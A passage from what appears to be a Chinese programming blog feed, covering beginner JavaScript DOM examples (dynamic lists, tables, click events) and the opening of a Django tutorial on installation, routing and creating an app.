...：要添加到数组的新元素（可选）。如果未指定，则只删除元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">v1.<span class="title function_">splice</span>(<span class="number">1</span>,<span class="number">0</span>,<span class="number">88</span>); <span class="comment">//从索引为1开始删除0个元素，并插入88这个元素，结果[55,88,22,33,44]</span></span><br><span class="line">v1.<span class="title function_">splice</span>(<span class="number">1</span>,<span class="number">2</span>); <span class="comment">//从索引为1开始删除2个元素,结果[55,33,44]</span></span><br></pre></td></tr></table></figure><h4 id="案例：动态数组"><a href="#案例：动态数组" class="headerlink" title="案例：动态数组"></a>案例：动态数组</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> hobby = [<span class="string">&quot;唱&quot;</span>,<span class="string">&quot;跳&quot;</span>,<span class="string">&quot;rap&quot;</span>,<span class="string">&quot;篮球&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ul = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;ul&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> hobby) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> text = hobby[i];</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            li.<span class="property">innerText</span> = text;</span></span><br><span class="line"><span class="language-javascript">            ul.<span class="title function_">appendChild</span>(li);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(ul);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本案例实现了自动创建<code>ul</code>以及编辑<code>li</code>标签的内容的功能</p><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">table</span>, <span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> table = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;table&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> thead = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;thead&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        table.<span class="title function_">appendChild</span>(thead);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tbody = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;tbody&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        table.<span class="title function_">appendChild</span>(tbody);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> thr = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;tr&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        thead.<span class="title function_">appendChild</span>(thr); </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> th = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;th&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        th.<span class="property">innerHTML</span> = <span class="string">&quot;姓名&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        thr.<span class="title function_">appendChild</span>(th);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        th = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;th&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        th.<span class="property">innerHTML</span> = <span class="string">&quot;年龄&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        thr.<span class="title function_">appendChild</span>(th);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        th = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;th&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        th.<span class="property">innerText</span> = <span class="string">&quot;性别&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        thr.<span class="title function_">appendChild</span>(th);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> info = &#123; <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span>, <span class="attr">age</span>: <span class="number">18</span>, <span class="attr">gender</span>: <span class="string">&quot;男&quot;</span> &#125;;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tbr = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;tr&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> info) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> td = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;td&quot;</span>); </span></span><br><span class="line"><span class="language-javascript">            td.<span class="property">innerText</span> = info[key];</span></span><br><span class="line"><span class="language-javascript">            tbr.<span class="title function_">appendChild</span>(td);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        tbody.<span class="title function_">appendChild</span>(tbr);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(table);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本案例结合了<code>css</code>以及<code>javascript</code>创建了一个<code>table</code>，但是表格只能读取一个数据，如果字典里面有多个数据，需要使用二重循环。如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">table</span>, <span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-collapse</span>: collapse;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> table = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;table&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> thead = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;thead&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        table.<span class="title function_">appendChild</span>(thead);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tbody = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;tbody&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        table.<span class="title function_">appendChild</span>(tbody);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> thr = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;tr&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        thead.<span class="title function_">appendChild</span>(thr); </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> th = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;th&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        th.<span class="property">innerHTML</span> = <span class="string">&quot;姓名&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        thr.<span class="title function_">appendChild</span>(th);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        th = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;th&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        th.<span class="property">innerHTML</span> = <span class="string">&quot;年龄&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        thr.<span class="title function_">appendChild</span>(th);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        th = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;th&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        th.<span class="property">innerText</span> = <span class="string">&quot;性别&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        thr.<span class="title function_">appendChild</span>(th);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> info =[ &#123; <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span>, <span class="attr">age</span>: <span class="number">18</span>, <span class="attr">gender</span>: <span class="string">&quot;男&quot;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">                    &#123; <span class="attr">name</span>: <span class="string">&quot;李四&quot;</span>, <span class="attr">age</span>: <span class="number">19</span>, <span class="attr">gender</span>: <span class="string">&quot;男&quot;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                    &#123; <span class="attr">name</span>: <span class="string">&quot;王五&quot;</span>, <span class="attr">age</span>: <span class="number">20</span>, <span class="attr">gender</span>: <span class="string">&quot;女&quot;</span>&#125; </span></span><br><span class="line"><span class="language-javascript">        ];</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> inx <span class="keyword">in</span> info) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> one_info = info[inx];</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> tbr = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;tr&quot;</span>); </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> one_info) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> td = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;td&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                td.<span class="property">innerText</span> = one_info[key]; </span></span><br><span class="line"><span class="language-javascript">                tbr.<span class="title function_">appendChild</span>(td);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            tbody.<span class="title function_">appendChild</span>(tbr);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(table);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (条件) </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params"></span>) &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func</span><br></pre></td></tr></table></figure><h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p>DOM，就是一个模块，可以对HTML页面中的标签进行操作。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//根据ID获取标签</span></span><br><span class="line"><span class="keyword">var</span> tag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;xx&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取标签中的文本</span></span><br><span class="line">tag.<span class="property">innerText</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改标签中的文本</span></span><br><span class="line">tag.<span class="property">innerText</span> = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建标签</span></span><br><span class="line"><span class="keyword">var</span> tag = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//编写标签内容</span></span><br><span class="line">tag.<span class="property">innerText</span> = <span class="string">&quot;hello world&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="事件的绑定"><a href="#事件的绑定" class="headerlink" title="事件的绑定"></a>事件的绑定</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入内容&quot;</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;打印&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;printContent()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;ul&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">printContent</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//获取输入框的内容</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> tagcontent = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> content = tagcontent.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//判断输入框是否为空以及是否只输入空格</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (content.<span class="title function_">trim</span>() == <span class="string">&quot;&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&quot;请输入内容&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                tagcontent.<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//获取ul标签</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> ul = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;ul&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//创建li标签</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            li.<span class="property">innerText</span> = content;</span></span><br><span class="line"><span class="language-javascript">            ul.<span class="title function_">appendChild</span>(li);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//清空输入框</span></span></span><br><span class="line"><span class="language-javascript">            tagcontent.<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述示例完成了将用户输入的内容打印到html页面上。其中</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;打印&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;printContent()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>onclick</code>为鼠标单击事件。</p><p><strong>ps</strong>：DOM有许多内容，但实际开发中不需要自己编写。常用<strong>jQuery</strong> / <strong>vue.js</strong> / <strong>react.js</strong> 来辅助开发</p><h2 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h2><p>jQuery是一个JavaScript的第三方模块（第三方类库）。</p><h2 id="Bootstrap"><a href="#Bootstrap" class="headerlink" title="Bootstrap"></a>Bootstrap</h2><p>别人已经写好的<strong>CSS</strong>样式，使用方法：</p><ul><li>下载BootStrap</li><li><p>引入bootStrap</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;static/css/bootstrap.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>href</code>填写存放BootStrap的路径</p></li><li><p>在官网寻找需要的组件并cv</p></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> 前端三剑客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web程序设计 </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django实践</title>
      <link href="/2024/08/14/Django%E5%AE%9E%E8%B7%B5/"/>
      <url>/2024/08/14/Django%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<div id="postchat_postcontent"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于博主本学期开设了web程序设计这门课，于是为了进行开发，不得不学习python里面的一些web框架。早闻<code>Django</code>大名，遂开始学习，谨以此博客记录<code>Django</code>学习记录</p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><code>Django</code>作为一款优秀的<strong>python web框架</strong>，安装也是非常简单的。只需在命令行输入</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install django</span><br></pre></td></tr></table></figure><p>如果安装了<code>anaconda</code>也可以先新建一个虚拟环境来进行开发</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">conda create -n django_test python=<span class="number">3</span>.<span class="number">10</span></span><br><span class="line">conda activate django_test</span><br><span class="line">pip install django</span><br></pre></td></tr></table></figure><p>安装完之后，<code>django</code>会自动添加<code>django-admin.exe</code>到环境目录。</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408142356150.png" alt="image-20240814235646017"></p><p>出现以上图片即说明安装成功。</p><p>如果要创建一个新的项目，运行</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">django-admin startproject django_test</span><br></pre></td></tr></table></figure><p>则会出现以下目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\DJANGO_TEST</span><br><span class="line">│─ manage.py            管理项目的文件。例如：运行、类自动生成数据表</span><br><span class="line">│</span><br><span class="line">└─django_test           </span><br><span class="line">        asgi.py         异步运行项目，编写socket，处理网络请求</span><br><span class="line">        settings.py     项目的配置文件、例如：连接的数据库的账户密码等等</span><br><span class="line">        urls.py         根路由，URL和函数的对应关系  /login-&gt;do_login</span><br><span class="line">        wsgi.py         同步运行项目，编写socket，处理网络请求</span><br><span class="line">        __init__.py</span><br></pre></td></tr></table></figure><h1 id="初识Django"><a href="#初识Django" class="headerlink" title="初识Django"></a>初识Django</h1><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p>在项目根目录运行</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python manage.py runserver</span><br></pre></td></tr></table></figure><p>django会自动启动一个web服务在<code>localhost:8000</code>，用浏览器访问会出现以下界面<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408150013176.png" alt="image-20240815001328887"></p><h2 id="自定义路由"><a href="#自定义路由" class="headerlink" title="自定义路由"></a>自定义路由</h2><p>刚刚提到django_test/urls.py是管理路由的地方，于是想着能不能自己写一个url访问，编写urls.py如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;登录页面&quot;</span>)</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&quot;admin/&quot;</span>, admin.site.urls),</span><br><span class="line">    path(<span class="string">&quot;login/&quot;</span>, login),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>同时访问<code>localhost:8000/login</code>页面<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408150025795.png" alt="image-20240815002545677"></p><p>这样就自定义了一个页面<del>（虽然只有文本，也很丑）</del>，这是因为返回的是一个<code>HttpResponse</code>类的缘故，关于该类之后再详细介绍。</p><h2 id="自定义app"><a href="#自定义app" class="headerlink" title="自定义app"></a>自定义app</h2><p>前面介绍了<code>login()</code>函数，试想一下，如果正在做一个大工程，自定义的页面比较多，那么<code>urls.py</code>里面实现的函数就比较多，不利于开发，如果能把函数实现放在另一个文件里面定义，再在<code>urls.py</code>里面<code>import</code>更利于开发。因此引入<code>app</code></p><p>创建一个app，在命令行输入</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python manage.py startapp web</span><br></pre></td></tr></table></figure><p>这样就创建了一个叫<code>web</code>的app，此时目录结构应该长这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\DJANGO_TEST</span><br><span class="line">│  db.sqlite3</span><br><span class="line">│  manage.py</span><br><span class="line">│</span><br><span class="line">├─django_test</span><br><span class="line">│  │  asgi.py</span><br><span class="line">│  │  settings.py</span><br><span class="line">│  │  urls.py</span><br><span class="line">│  │  wsgi.py</span><br><span class="line">│  │  __init__.py</span><br><span class="line">│  │</span><br><span class="line">│  └─__pycache__</span><br><span class="line">│          settings.cpython-39.pyc</span><br><span class="line">│          urls.cpython-39.pyc</span><br><span class="line">│          wsgi.cpython-39.pyc</span><br><span class="line">│          __init__.cpython-39.pyc</span><br><span class="line">│</span><br><span class="line">└─web</span><br><span class="line">    │  admin.py                 内部后台管理配置</span><br><span class="line">    │  apps.py                  App的名字</span><br><span class="line">    │  models.py                数据库操作，类-&gt;SQL语句（ORM）</span><br><span class="line">    │  tests.py                 单元测试</span><br><span class="line">    │  views.py                 主要写视图函数，例如上例中的login函数</span><br><span class="line">    │  __init__.py</span><br><span class="line">    │</span><br><span class="line">    └─migrations                迁移记录，自动生成，不要修改</span><br><span class="line">            __init__.py</span><br></pre></td></tr></table></figure><p>接下来，将login函数放到view.py里面<br><code>web/views.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;登录页面&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>django_test/urls.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> web.views <span class="keyword">import</span> login</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&quot;admin/&quot;</span>, admin.site.urls),</span><br><span class="line">    path(<span class="string">&quot;login/&quot;</span>, login),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="初识视图函数"><a href="#初识视图函数" class="headerlink" title="初识视图函数"></a>初识视图函数</h2><ul><li><p>视图函数中的形参<code>request</code>是什么？   